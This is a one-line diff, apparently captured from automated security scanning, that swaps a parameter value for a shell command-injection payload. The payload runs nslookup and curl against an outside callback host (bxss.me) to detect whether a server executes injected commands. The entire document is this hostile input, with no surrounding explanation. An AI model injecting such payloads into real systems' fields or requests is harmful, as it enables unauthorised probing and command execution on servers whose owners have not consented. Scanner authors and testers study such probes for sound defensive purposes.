@@ -1,1 +1,1 @@
-555&n917879=v937314
+(nslookup -q=cname hitieobkmpcggd3c78.bxss.me||curl hitieobkmpcggd3c78.bxss.me))
